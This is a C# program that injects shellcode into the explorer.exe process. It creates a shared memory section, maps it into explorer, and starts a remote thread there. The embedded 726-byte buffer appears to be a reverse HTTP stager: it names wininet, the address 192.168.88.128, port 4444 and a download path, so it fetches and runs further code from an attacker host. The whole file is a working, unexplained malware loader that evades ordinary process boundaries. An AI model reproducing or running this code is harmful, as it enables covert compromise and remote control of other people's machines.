using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace HelloThere
{
    class Program
    {
        // OpenProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // CreateRemoteThread - kernel32.dll
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        // GetCurrentProcess - kernel32.dll
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        // ntdll.dll API functions:
        // NtCreateSection
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        // NtUnmapViewOfSection
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        // NtClose
        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern uint FormatMessage(
            uint dwFlags,
            IntPtr lpSource,
            uint dwMessageId,
            uint dwLanguageId,
            [Out] StringBuilder lpBuffer,
            uint nSize,
            IntPtr Arguments);

        const uint FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100;
        const uint FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200;
        const uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;

        static int Main(string[] args)
        {
            byte[] buf = new byte[726] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x8b,0x48,0x18,
0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
0x2e,0x38,0x38,0x2e,0x31,0x32,0x38,0x00,0x5a,0x48,0x89,0xc1,
0x49,0xc7,0xc0,0x5c,0x11,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
0x00,0xff,0xd5,0xe8,0xce,0x00,0x00,0x00,0x2f,0x61,0x69,0x6c,
0x55,0x44,0x76,0x77,0x48,0x55,0x46,0x72,0x70,0x67,0x75,0x69,
0x41,0x6a,0x5f,0x45,0x66,0x4c,0x51,0x53,0x44,0x73,0x34,0x56,
0x55,0x4c,0x35,0x49,0x51,0x34,0x48,0x65,0x6f,0x58,0x44,0x67,
0x58,0x4d,0x67,0x69,0x65,0x51,0x4f,0x68,0x4b,0x4e,0x50,0x5f,
0x69,0x75,0x6d,0x6e,0x53,0x33,0x45,0x68,0x77,0x37,0x57,0x4d,
0x7a,0x5f,0x6d,0x4c,0x67,0x78,0x49,0x65,0x2d,0x69,0x6a,0x61,
0x6c,0x66,0x6a,0x2d,0x70,0x30,0x79,0x35,0x58,0x5f,0x4d,0x55,
0x55,0x4d,0x41,0x64,0x74,0x64,0x44,0x32,0x57,0x4f,0x61,0x73,
0x73,0x43,0x43,0x68,0x73,0x36,0x4a,0x70,0x79,0x74,0x4b,0x59,
0x64,0x35,0x56,0x4a,0x42,0x54,0x49,0x72,0x78,0x59,0x65,0x4e,
0x4a,0x61,0x6e,0x57,0x65,0x6f,0x53,0x69,0x30,0x6a,0x33,0x32,
0x65,0x42,0x68,0x6b,0x6f,0x6c,0x42,0x63,0x44,0x37,0x55,0x66,
0x71,0x71,0x54,0x69,0x57,0x6e,0x64,0x4d,0x70,0x49,0x33,0x6f,
0x59,0x47,0x36,0x33,0x57,0x4e,0x56,0x6d,0x4c,0x33,0x4f,0x70,
0x36,0x4c,0x6e,0x54,0x57,0x46,0x63,0x4d,0x72,0x7a,0x30,0x30,
0x7a,0x67,0x34,0x71,0x4f,0x6c,0x6d,0x38,0x44,0x6b,0x4c,0x68,
0x4d,0x50,0x65,0x56,0x56,0x47,0x79,0x70,0x31,0x00,0x48,0x89,
0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
0x02,0x28,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,
0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,
0x5f,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,
0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,
0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,
0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,
0xcf,0x74,0x02,0xeb,0xcc,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,
0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,
0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,
0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,
0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,
0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,
0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
};

            /* Create section */
            IntPtr hSection = IntPtr.Zero;
            long size = buf.Length;
            uint result = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref size, 0x40, 0x8000000, IntPtr.Zero);
            if (result != 0)
            {
                return -1;
            }
            else
            {
                Console.WriteLine("[+] New section handle: 0x"+String.Format("{0:X}",(hSection).ToInt64()));
            }
            /*Create local section view*/
            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(hSection, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref size, 0x2, 0, 0x04);
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(hSection, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref size, 0x2, 0, 0x20);
            Console.WriteLine("shellcode Addr = 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(hSection);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                int errorCode = Marshal.GetLastWin32Error();
                Console.WriteLine($"CreateRemoteThread failed with error code: {errorCode}");

                StringBuilder messageBuffer = new StringBuilder(256);
                FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, IntPtr.Zero, (uint)errorCode, 0, messageBuffer, (uint)messageBuffer.Capacity, IntPtr.Zero);
                Console.WriteLine($"Error message: {messageBuffer}");
            }

            return 0;
        }
    }
}
